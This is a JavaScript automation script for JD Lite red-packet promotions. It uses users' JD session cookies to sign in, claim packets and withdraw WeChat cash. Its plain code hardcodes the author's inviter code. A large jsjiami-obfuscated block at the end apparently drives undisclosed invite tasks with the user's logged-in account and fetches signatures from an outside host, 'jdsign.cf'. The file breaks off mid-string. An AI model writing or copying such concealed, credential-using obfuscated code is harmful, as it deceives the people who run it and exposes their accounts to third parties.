/*
京东极速版红包
自动提现微信现金
更新时间：2021-8-2
活动时间：2021-4-6至2021-5-30
活动地址：https://prodev.m.jd.com/jdlite/active/31U4T6S4PbcK83HyLPioeCWrD63j/index.html
活动入口：京东极速版-领红包
已支持IOS双京东账号,Node.js支持N个京东账号
脚本兼容: QuantumultX, Surge, Loon, JSBox, Node.js
============Quantumultx===============
[task_local]
#京东极速版红包
20 0,22 * * * jd_speed_redpocke.js, tag=京东极速版红包, img-url=https://raw.githubusercontent.com/Orz-3/mini/master/Color/jd.png, enabled=true

================Loon==============
[Script]
cron "20 0,22 * * *" script-path=jd_speed_redpocke.js,tag=京东极速版红包

===============Surge=================
京东极速版红包 = type=cron,cronexp="20 0,22 * * *",wake-system=1,timeout=3600,script-path=jd_speed_redpocke.js

============小火箭=========
京东极速版红包 = type=cron,script-path=jd_speed_redpocke.js, cronexpr="20 0,22 * * *", timeout=3600, enable=true
*/
const $ = new Env('京东极速版红包');
const notify = $.isNode() ? require('./sendNotify') : '';
//Node.js用户请在jdCookie.js处填写京东ck;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
let cookiesArr = [], cookie = '', message;
const linkIdArr = ["Eu7-E0CUzqYyhZJo9d3YkQ"];
const signLinkId = '9WA12jYGulArzWS7vcrwhw';
let linkId;
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
  if (JSON.stringify(process.env).indexOf('GITHUB') > -1) process.exit(0);
} else {
  cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
}
!(async () => {
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      console.log(`\n如提示活动火爆,可再执行一次尝试\n`);
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      message = '';
      await TotalBean();
      console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      for (let j = 0; j < linkIdArr.length; j++) {
        linkId = linkIdArr[j]
        await jsRedPacket()
      }
    }
  }
})()
  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })

async function jsRedPacket() {
  try {
    await invite2();
    await sign();//极速版签到提现
    await reward_query();
    for (let i = 0; i < 3; i++) {
      await redPacket();//开红包
      await $.wait(2000)
    }
    await getPacketList();//领红包提现
    await signPrizeDetailList();
    await showMsg()
  } catch (e) {
    $.logErr(e)
  }
}

function showMsg() {
  return new Promise(resolve => {
    if (message) $.msg($.name, '', `京东账号${$.index}${$.nickName}\n${message}`);
    resolve()
  })
}
async function sign() {
  return new Promise(async resolve => {
    const body = {"linkId":signLinkId,"serviceName":"dayDaySignGetRedEnvelopeSignService","business":1};
    const options = {
      url: `https://api.m.jd.com`,
      body: await getSign("apSignIn_day", body, true),
      headers: {
        "Host": "api.m.jd.com",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://daily-redpacket.jd.com",
        "Accept-Language": "zh-CN,zh-Hans;q=0.9",
        "User-Agent": $.isNode() ? (process.env.JS_USER_AGENT ? process.env.JS_USER_AGENT : (require('./JS_USER_AGENTS').USER_AGENT)) : ($.getdata('JSUA') ? $.getdata('JSUA') : "'jdltapp;iPad;3.1.0;14.4;network/wifi;Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
        "Referer": "https://daily-redpacket.jd.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Cookie": cookie
      }
    }
    $.post(options, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = $.toObj(data);
            if (data.code === 0) {
              if (data.data.retCode === 0) {
                message += `极速版签到提现：签到成功\n`;
                console.log(`极速版签到提现：签到成功\n`);
              } else {
                console.log(`极速版签到提现：签到失败:${data.data.retMessage}\n`);
              }
            } else {
              console.log(`极速版签到提现：签到异常:${JSON.stringify(data)}\n`);
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
function reward_query() {
  return new Promise(resolve => {
    $.get(taskGetUrl("spring_reward_query", {
      linkId,
      "inviter": ["HXZ60he5XxG8XNUF2LSrZg"][Math.floor((Math.random() * 1))]
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0) {

            } else {
              console.log(data.errMsg)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
async function redPacket() {
  return new Promise(async resolve => {
    let body = {linkId, "inviter":["HXZ60he5XxG8XNUF2LSrZg"][Math.floor((Math.random() * 1))]}
    body = await getSign("spring_reward_receive", body, true)
    let options = {
      url: `https://api.m.jd.com/?${body}`,
      headers: {
        "Host": "api.m.jd.com",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://prodev.m.jd.com",
        "Accept-Encoding": "gzip, deflate, br",
        "User-Agent": $.isNode() ? (process.env.JS_USER_AGENT ? process.env.JS_USER_AGENT : (require('./JS_USER_AGENTS').USER_AGENT)) : ($.getdata('JSUA') ? $.getdata('JSUA') : "'jdltapp;iPad;3.1.0;14.4;network/wifi;Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
        "Accept-Language": "zh-CN,zh-Hans;q=0.9",
        "Referer": "https://prodev.m.jd.com/",
        "Cookie": cookie
      }
    }
    $.get(options, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0) {
              if (data.data.received.prizeType !== 1) {
                message += `获得${data.data.received.prizeDesc}\n`
                console.log(`获得${data.data.received.prizeDesc}`)
              } else {
                console.log("获得优惠券")
              }
            } else {
              console.log(data.errMsg)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

function getPacketList() {
  return new Promise(resolve => {
    $.get(taskGetUrl("spring_reward_list", {"pageNum":1,"pageSize":100,linkId,"inviter":""}), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0) {
              for (let item of data.data.items.filter(vo => vo.prizeType === 4)) {
                if (item.state === 0) {
                  console.log(`去提现${item.amount}微信现金`)
                  message += `提现${item.amount}微信现金，`
                  await cashOut(item.id, item.poolBaseId, item.prizeGroupId, item.prizeBaseId)
                }
              }
            } else {
              console.log(data.errMsg)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
function signPrizeDetailList() {
  return new Promise(resolve => {
    const body = {"linkId":signLinkId,"serviceName":"dayDaySignGetRedEnvelopeSignService","business":1,"pageSize":20,"page":1};
    $.post(taskPostUrl("signPrizeDetailList", body), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = $.toObj(data);
            if (data.code === 0) {
              if (data.data.code === 0) {
                const list = (data.data.prizeDrawBaseVoPageBean.items || []).filter(vo => vo['prizeType'] === 4 && vo['prizeStatus'] === 0);
                for (let code of list) {
                  console.log(`极速版签到提现，去提现${code['prizeValue']}现金\n`);
                  message += `极速版签到提现，去提现${code['prizeValue']}微信现金，`
                  await apCashWithDraw(code['id'], code['poolBaseId'], code['prizeGroupId'], code['prizeBaseId']);
                }
              } else {
                console.log(`极速版签到查询奖品：失败:${JSON.stringify(data)}\n`);
              }
            } else {
              console.log(`极速版签到查询奖品：异常:${JSON.stringify(data)}\n`);
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
function apCashWithDraw(id, poolBaseId, prizeGroupId, prizeBaseId) {
  return new Promise(resolve => {
    const body = {
      "linkId": signLinkId,
      "businessSource": "DAY_DAY_RED_PACKET_SIGN",
      "base": {
        "prizeType": 4,
        "business": "dayDayRedPacket",
        "id": id,
        "poolBaseId": poolBaseId,
        "prizeGroupId": prizeGroupId,
        "prizeBaseId": prizeBaseId
      }
    }
    $.post(taskPostUrl("apCashWithDraw", body), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = $.toObj(data);
            if (data.code === 0) {
              if (data.data.status === "310") {
                console.log(`极速版签到提现现金成功！`)
                message += `极速版签到提现现金成功！`;
              } else {
                console.log(`极速版签到提现现金：失败:${JSON.stringify(data)}\n`);
              }
            } else {
              console.log(`极速版签到提现现金：异常:${JSON.stringify(data)}\n`);
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
function cashOut(id, poolBaseId, prizeGroupId, prizeBaseId) {
  let body = {
    "businessSource": "SPRING_FESTIVAL_RED_ENVELOPE",
    "base": {
      "id": id,
      "business": null,
      "poolBaseId": poolBaseId,
      "prizeGroupId": prizeGroupId,
      "prizeBaseId": prizeBaseId,
      "prizeType": 4
    },
    linkId,
    "inviter": ""
  }
  return new Promise(resolve => {
    $.post(taskPostUrl("apCashWithDraw", body), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            console.log(`提现零钱结果：${data}`)
            data = JSON.parse(data);
            if (data.code === 0) {
              if (data['data']['status'] === "310") {
                console.log(`提现成功！`)
                message += `提现成功！\n`;
              } else {
                console.log(`提现失败：${data['data']['message']}`);
                message += `提现失败：${data['data']['message']}`;
              }
            } else {
              console.log(`提现异常：${data['errMsg']}`);
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
function taskPostUrl(function_id, body) {
  return {
    url: `https://api.m.jd.com/`,
    body: `functionId=${function_id}&body=${encodeURIComponent(JSON.stringify(body))}&t=${+new Date()}&appid=activities_platform&client=H5&clientVersion=1.0.0`,
    headers: {
      "Host": "api.m.jd.com",
      "Accept": "application/json, text/plain, */*",
      "Content-Type": "application/x-www-form-urlencoded",
      "Origin": "https://daily-redpacket.jd.com",
      "Accept-Language": "zh-CN,zh-Hans;q=0.9",
      "User-Agent": $.isNode() ? (process.env.JS_USER_AGENT ? process.env.JS_USER_AGENT : (require('./JS_USER_AGENTS').USER_AGENT)) : ($.getdata('JSUA') ? $.getdata('JSUA') : "'jdltapp;iPad;3.1.0;14.4;network/wifi;Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
      "Referer": "https://daily-redpacket.jd.com/",
      "Accept-Encoding": "gzip, deflate, br",
      "Cookie": cookie
    }
  }
}
function taskGetUrl(function_id, body) {
  return {
    url: `https://api.m.jd.com/?functionId=${function_id}&body=${encodeURIComponent(JSON.stringify(body))}&t=${Date.now()}&appid=activities_platform`,
    headers: {
      "Host": "api.m.jd.com",
      "Accept": "application/json, text/plain, */*",
      "Origin": "https://prodev.m.jd.com",
      "Accept-Encoding": "gzip, deflate, br",
      "User-Agent": $.isNode() ? (process.env.JS_USER_AGENT ? process.env.JS_USER_AGENT : (require('./JS_USER_AGENTS').USER_AGENT)) : ($.getdata('JSUA') ? $.getdata('JSUA') : "'jdltapp;iPad;3.1.0;14.4;network/wifi;Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
      "Accept-Language": "zh-CN,zh-Hans;q=0.9",
      "Referer": "https://prodev.m.jd.com/",
      "Cookie": cookie
    }
  }
}

function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      url: "https://me-api.jd.com/user_new/info/GetJDUserInfoUnion",
      headers: {
        Host: "me-api.jd.com",
        Accept: "*/*",
        Connection: "keep-alive",
        Cookie: cookie,
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
        "Accept-Language": "zh-cn",
        "Referer": "https://home.m.jd.com/myJd/newhome.action?sceneval=2&ufc=&",
        "Accept-Encoding": "gzip, deflate, br"
      }
    }
    $.get(options, (err, resp, data) => {
      try {
        if (err) {
          $.logErr(err)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === "1001") {
              $.isLogin = false; //cookie过期
              return;
            }
            if (data['retcode'] === "0" && data.data && data.data.hasOwnProperty("userInfo")) {
              $.nickName = data.data.userInfo.baseInfo.nickname;
            }
          } else {
            console.log('京东服务器返回空数据');
          }
        }
      } catch (e) {
        $.logErr(e)
      } finally {
        resolve();
      }
    })
  })
}

function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}

function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
var _0xodu='jsjiami.com.v6',_0xodu_=['‮_0xodu'],_0x3d1d=[_0xodu,'\x65\x48\x46\x57\x62\x56\x49\x3d','\x63\x47\x39\x7a\x64\x41\x3d\x3d','\x61\x33\x68\x61\x53\x55\x67\x3d','\x61\x55\x31\x49\x55\x57\x6f\x3d','\x57\x57\x39\x71\x54\x31\x63\x3d','\x59\x58\x64\x49\x65\x55\x6f\x3d','\x56\x47\x6c\x4f\x64\x6b\x34\x3d','\x62\x45\x6c\x5a\x63\x32\x55\x3d','\x59\x56\x42\x4c\x51\x6d\x45\x3d','\x61\x32\x56\x35\x63\x77\x3d\x3d','\x5a\x6d\x39\x79\x52\x57\x46\x6a\x61\x41\x3d\x3d','\x53\x30\x74\x35\x53\x57\x51\x3d','\x54\x6d\x74\x69\x62\x56\x55\x3d','\x57\x57\x4a\x71\x53\x6e\x51\x3d','\x5a\x58\x4e\x7a\x5a\x58\x6b\x3d','\x52\x30\x64\x48\x54\x48\x49\x3d','\x62\x47\x39\x6e','\x62\x6d\x46\x74\x5a\x51\x3d\x3d','\x49\x47\x64\x6c\x64\x47\x67\x31\x63\x33\x51\x67\x51\x56\x42\x4a\x36\x4b\x2b\x33\x35\x72\x47\x43\x35\x61\x53\x78\x36\x4c\x53\x6c\x37\x37\x79\x4d\x36\x4b\x2b\x33\x35\x71\x4f\x41\x35\x70\x2b\x6c\x35\x37\x32\x52\x36\x4c\x65\x76\x36\x59\x65\x4e\x36\x4b\x2b\x56','\x56\x6b\x56\x6a\x64\x57\x34\x3d','\x56\x6e\x4e\x4d\x56\x57\x73\x3d','\x61\x6d\x52\x74\x53\x46\x49\x3d','\x62\x56\x5a\x43\x53\x47\x45\x3d','\x62\x6d\x6c\x4a\x65\x6e\x4d\x3d','\x63\x31\x68\x6a\x62\x45\x55\x3d','\x54\x55\x78\x71\x59\x33\x63\x3d','\x5a\x45\x39\x61\x51\x6b\x30\x3d','\x53\x47\x68\x44\x54\x6b\x45\x3d','\x62\x57\x70\x30\x55\x48\x6b\x3d','\x63\x58\x64\x6d\x57\x6b\x73\x3d','\x62\x47\x39\x6e\x52\x58\x4a\x79','\x55\x46\x4a\x57\x63\x55\x51\x3d','\x53\x6c\x46\x71\x5a\x47\x34\x3d','\x59\x58\x42\x77\x61\x57\x52\x54\x61\x57\x64\x75','\x54\x58\x6c\x4a\x54\x47\x6f\x3d','\x63\x48\x4e\x6b\x52\x56\x67\x3d','\x53\x55\x64\x6d\x64\x6d\x67\x3d','\x63\x6b\x39\x77\x5a\x6d\x30\x3d','\x56\x30\x74\x53\x51\x6c\x51\x3d','\x64\x47\x39\x31\x53\x30\x67\x3d','\x63\x6d\x6c\x76\x51\x56\x55\x3d','\x64\x30\x35\x54\x52\x55\x51\x3d','\x5a\x6e\x56\x75\x59\x33\x52\x70\x62\x32\x35\x4a\x5a\x44\x31\x55\x59\x58\x4e\x72\x53\x57\x35\x32\x61\x58\x52\x6c\x55\x32\x56\x79\x64\x6d\x6c\x6a\x5a\x53\x5a\x69\x62\x32\x52\x35\x50\x51\x3d\x3d','\x53\x32\x56\x73\x62\x55\x30\x3d','\x4a\x6d\x46\x77\x63\x47\x6c\x6b\x50\x57\x31\x68\x63\x6d\x74\x6c\x64\x43\x31\x30\x59\x58\x4e\x72\x4c\x57\x67\x31\x4a\x6e\x56\x31\x61\x57\x51\x39\x4a\x6c\x39\x30\x50\x51\x3d\x3d','\x62\x6d\x39\x33','\x55\x6b\x4a\x35\x54\x30\x51\x3d','\x52\x6d\x5a\x71\x54\x6c\x4d\x3d','\x5a\x55\x46\x73\x62\x57\x6b\x3d','\x54\x55\x68\x69\x56\x47\x59\x3d','\x53\x30\x52\x5a\x65\x47\x73\x3d','\x61\x58\x4e\x4f\x62\x32\x52\x6c','\x53\x6c\x4e\x66\x56\x56\x4e\x46\x55\x6c\x39\x42\x52\x30\x56\x4f\x56\x41\x3d\x3d','\x53\x45\x4a\x61\x59\x33\x55\x3d','\x65\x48\x4e\x6b\x53\x6b\x63\x3d','\x56\x56\x4e\x46\x55\x6c\x39\x42\x52\x30\x56\x4f\x56\x41\x3d\x3d','\x5a\x32\x56\x30\x5a\x47\x46\x30\x59\x51\x3d\x3d','\x55\x6d\x35\x6a\x59\x55\x38\x3d','\x5a\x58\x52\x55\x63\x32\x77\x3d','\x55\x31\x46\x6d\x64\x47\x4d\x3d','\x53\x58\x68\x69\x55\x30\x6f\x3d','\x4d\x44\x63\x79\x4e\x44\x51\x3d','\x59\x58\x42\x54\x61\x57\x64\x75\x53\x57\x35\x66\x5a\x47\x46\x35','\x61\x30\x4e\x71\x64\x58\x6f\x3d','\x64\x45\x52\x31\x5a\x32\x30\x3d','\x59\x6d\x39\x6b\x65\x51\x3d\x3d','\x52\x6b\x70\x59\x54\x55\x45\x3d','\x5a\x33\x5a\x72\x61\x32\x6b\x3d','\x57\x56\x4a\x32\x51\x55\x49\x3d','\x51\x6e\x5a\x43\x61\x6d\x77\x3d','\x62\x45\x68\x33\x57\x47\x55\x3d','\x63\x30\x64\x30\x59\x58\x59\x3d','\x64\x6d\x64\x44\x59\x30\x55\x3d','\x62\x6e\x42\x68\x54\x6c\x63\x3d','\x56\x6e\x70\x57\x62\x30\x55\x3d','\x54\x45\x39\x4b\x51\x31\x67\x3d','\x59\x58\x4e\x7a\x61\x57\x64\x75','\x5a\x45\x35\x32\x51\x6e\x55\x3d','\x62\x57\x52\x76\x54\x6b\x77\x3d','\x56\x33\x70\x73\x5a\x30\x67\x3d','\x61\x33\x56\x70\x62\x32\x67\x3d','\x52\x48\x46\x76\x63\x58\x4d\x3d','\x62\x57\x64\x49\x64\x56\x55\x3d','\x61\x33\x56\x69\x61\x6c\x51\x3d','\x52\x58\x4e\x74\x53\x6d\x45\x3d','\x55\x47\x5a\x75\x65\x6c\x59\x3d','\x5a\x57\x31\x49\x56\x47\x51\x3d','\x5a\x48\x5a\x4e\x62\x30\x34\x3d','\x57\x6d\x52\x46\x65\x47\x6f\x3d','\x59\x55\x5a\x44\x59\x32\x59\x3d','\x61\x55\x52\x44\x52\x6d\x6f\x3d','\x65\x56\x42\x76\x56\x6e\x55\x3d','\x51\x6d\x56\x6c\x55\x57\x55\x3d','\x57\x48\x64\x50\x62\x55\x63\x3d','\x62\x58\x4e\x77\x64\x6d\x6b\x3d','\x62\x6c\x52\x4d\x5a\x6c\x55\x3d','\x51\x30\x78\x74\x64\x47\x55\x3d','\x64\x32\x64\x4a\x61\x58\x49\x3d','\x63\x6d\x5a\x44\x56\x30\x6f\x3d','\x54\x32\x56\x48\x5a\x31\x6b\x3d','\x5a\x48\x52\x56\x62\x48\x6f\x3d','\x54\x57\x35\x57\x64\x6c\x4d\x3d','\x55\x57\x6c\x49\x65\x47\x6b\x3d','\x51\x31\x56\x51\x65\x57\x67\x3d','\x65\x58\x64\x6a\x52\x55\x77\x3d','\x59\x6b\x56\x76\x54\x6b\x6b\x3d','\x63\x48\x42\x71\x59\x32\x49\x3d','\x61\x30\x78\x57\x65\x47\x6b\x3d','\x63\x55\x6c\x33\x56\x32\x55\x3d','\x5a\x57\x35\x45\x62\x31\x67\x3d','\x65\x47\x4a\x56\x64\x57\x6f\x3d','\x56\x6d\x46\x55\x62\x46\x45\x3d','\x63\x55\x46\x52\x63\x48\x59\x3d','\x62\x46\x70\x59\x57\x56\x45\x3d','\x61\x57\x4a\x75\x55\x6d\x6f\x3d','\x63\x6b\x31\x35\x54\x31\x41\x3d','\x64\x6d\x5a\x76\x63\x47\x63\x3d','\x59\x57\x4e\x30\x61\x58\x5a\x70\x64\x47\x6c\x6c\x63\x31\x39\x77\x62\x47\x46\x30\x5a\x6d\x39\x79\x62\x51\x3d\x3d','\x57\x58\x5a\x72\x4c\x32\x5a\x4e\x56\x30\x70\x44\x4c\x7a\x5a\x73\x64\x6d\x4e\x34\x4d\x57\x6c\x56\x52\x6d\x35\x7a\x64\x7a\x30\x39','\x52\x54\x6c\x46\x64\x6c\x4e\x47\x54\x6e\x56\x42\x4d\x58\x42\x68\x61\x46\x4e\x52\x56\x44\x42\x31\x55\x33\x4e\x59\x61\x31\x63\x78\x64\x6a\x42\x71\x4b\x31\x46\x50\x53\x46\x46\x69\x61\x7a\x67\x72\x63\x47\x56\x4b\x57\x57\x4d\x77\x53\x54\x30\x3d','\x4e\x45\x46\x57\x55\x57\x46\x76\x4b\x32\x56\x49\x4f\x46\x45\x34\x61\x33\x5a\x74\x57\x47\x35\x58\x62\x57\x74\x48\x4f\x47\x56\x6d\x4c\x32\x5a\x4f\x63\x6a\x56\x6d\x5a\x47\x56\x71\x62\x6b\x51\x35\x4b\x7a\x6c\x56\x5a\x32\x4a\x6c\x59\x7a\x30\x3d','\x61\x6d\x4a\x48\x51\x6c\x4a\x43\x55\x47\x38\x31\x52\x47\x31\x33\x51\x6a\x6c\x75\x64\x46\x52\x44\x55\x31\x5a\x50\x52\x31\x68\x31\x61\x44\x46\x5a\x55\x58\x6c\x6a\x59\x30\x4e\x31\x57\x6e\x42\x58\x64\x32\x49\x7a\x55\x47\x78\x4a\x59\x7a\x30\x3d','\x52\x48\x56\x78\x54\x44\x55\x32\x4c\x7a\x4e\x6f\x4d\x54\x64\x57\x63\x47\x4a\x49\x53\x56\x63\x72\x64\x6a\x68\x31\x53\x6c\x4a\x53\x65\x56\x42\x4d\x4e\x6d\x73\x35\x52\x54\x46\x49\x64\x54\x56\x56\x61\x45\x4e\x35\x53\x48\x63\x76\x63\x7a\x30\x3d','\x62\x54\x6b\x31\x65\x53\x74\x51\x59\x57\x64\x7a\x62\x57\x34\x32\x59\x31\x68\x58\x64\x45\x35\x6f\x5a\x6e\x4a\x57\x4f\x58\x6c\x74\x52\x45\x34\x30\x55\x55\x73\x78\x61\x58\x5a\x7a\x62\x57\x4a\x4f\x4d\x7a\x4a\x73\x63\x45\x56\x49\x64\x7a\x30\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x68\x63\x47\x6b\x75\x62\x53\x35\x71\x5a\x43\x35\x6a\x62\x32\x30\x76','\x63\x47\x46\x79\x64\x47\x6c\x6a\x61\x58\x42\x68\x64\x47\x56\x4a\x62\x6e\x5a\x70\x64\x47\x56\x55\x59\x58\x4e\x72','\x59\x58\x42\x70\x4c\x6d\x30\x75\x61\x6d\x51\x75\x59\x32\x39\x74','\x59\x58\x42\x77\x62\x47\x6c\x6a\x59\x58\x52\x70\x62\x32\x34\x76\x61\x6e\x4e\x76\x62\x69\x77\x67\x64\x47\x56\x34\x64\x43\x39\x77\x62\x47\x46\x70\x62\x69\x77\x67\x4b\x69\x38\x71','\x59\x58\x42\x77\x62\x47\x6c\x6a\x59\x58\x52\x70\x62\x32\x34\x76\x65\x43\x31\x33\x64\x33\x63\x74\x5a\x6d\x39\x79\x62\x53\x31\x31\x63\x6d\x78\x6c\x62\x6d\x4e\x76\x5a\x47\x56\x6b','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x68\x63\x33\x4e\x70\x5a\x32\x35\x74\x5a\x57\x35\x30\x4c\x6d\x70\x6b\x4c\x6d\x4e\x76\x62\x51\x3d\x3d','\x65\x6d\x67\x74\x51\x30\x34\x73\x65\x6d\x67\x74\x53\x47\x46\x75\x63\x7a\x74\x78\x50\x54\x41\x75\x4f\x51\x3d\x3d','\x4c\x69\x39\x4b\x55\x31\x39\x56\x55\x30\x56\x53\x58\x30\x46\x48\x52\x55\x35\x55\x55\x77\x3d\x3d','\x53\x6c\x4e\x56\x51\x51\x3d\x3d','\x4a\x32\x70\x6b\x62\x48\x52\x68\x63\x48\x41\x37\x61\x56\x42\x68\x5a\x44\x73\x7a\x4c\x6a\x45\x75\x4d\x44\x73\x78\x4e\x43\x34\x30\x4f\x32\x35\x6c\x64\x48\x64\x76\x63\x6d\x73\x76\x64\x32\x6c\x6d\x61\x54\x74\x4e\x62\x33\x70\x70\x62\x47\x78\x68\x4c\x7a\x55\x75\x4d\x43\x41\x6f\x61\x56\x42\x68\x5a\x44\x73\x67\x51\x31\x42\x56\x49\x45\x39\x54\x49\x44\x45\x30\x58\x7a\x51\x67\x62\x47\x6c\x72\x5a\x53\x42\x4e\x59\x57\x4d\x67\x54\x31\x4d\x67\x57\x43\x6b\x67\x51\x58\x42\x77\x62\x47\x56\x58\x5a\x57\x4a\x4c\x61\x58\x51\x76\x4e\x6a\x41\x31\x4c\x6a\x45\x75\x4d\x54\x55\x67\x4b\x45\x74\x49\x56\x45\x31\x4d\x4c\x43\x42\x73\x61\x57\x74\x6c\x49\x45\x64\x6c\x59\x32\x74\x76\x4b\x53\x42\x4e\x62\x32\x4a\x70\x62\x47\x55\x76\x4d\x54\x56\x46\x4d\x54\x51\x34\x4f\x33\x4e\x31\x63\x48\x42\x76\x63\x6e\x52\x4b\x52\x46\x4e\x49\x56\x30\x73\x76\x4d\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x68\x63\x33\x4e\x70\x5a\x32\x35\x74\x5a\x57\x35\x30\x4c\x6d\x70\x6b\x4c\x6d\x4e\x76\x62\x53\x38\x3d','\x5a\x33\x70\x70\x63\x43\x77\x67\x5a\x47\x56\x6d\x62\x47\x46\x30\x5a\x53\x77\x67\x59\x6e\x49\x3d','\x59\x32\x78\x70\x5a\x57\x35\x30','\x59\x32\x78\x70\x5a\x57\x35\x30\x56\x6d\x56\x79\x63\x32\x6c\x76\x62\x67\x3d\x3d','\x4d\x53\x34\x77\x4c\x6a\x41\x3d','\x4d\x54\x55\x77\x4f\x54\x63\x3d','\x54\x6d\x35\x56\x63\x6b\x77\x3d','\x51\x32\x4e\x73\x56\x32\x67\x3d','\x61\x6d\x52\x7a\x61\x57\x64\x75\x4c\x6d\x4e\x6d','\x59\x58\x42\x77\x62\x47\x6c\x6a\x59\x58\x52\x70\x62\x32\x34\x76\x61\x6e\x4e\x76\x62\x67\x3d\x3d','\x54\x57\x39\x36\x61\x57\x78\x73\x59\x53\x38\x31\x4c\x6a\x41\x67\x4b\x47\x6c\x51\x61\x47\x39\x75\x5a\x54\x73\x67\x51\x31\x42\x56\x49\x47\x6c\x51\x61\x47\x39\x75\x5a\x53\x42\x50\x55\x79\x41\x78\x4d\x31\x38\x79\x58\x7a\x4d\x67\x62\x47\x6c\x72\x5a\x53\x42\x4e\x59\x57\x4d\x67\x54\x31\x4d\x67\x57\x43\x6b\x67\x51\x58\x42\x77\x62\x47\x56\x58\x5a\x57\x4a\x4c\x61\x58\x51\x76\x4e\x6a\x41\x31\x4c\x6a\x45\x75\x4d\x54\x55\x67\x4b\x45\x74\x49\x56\x45\x31\x4d\x4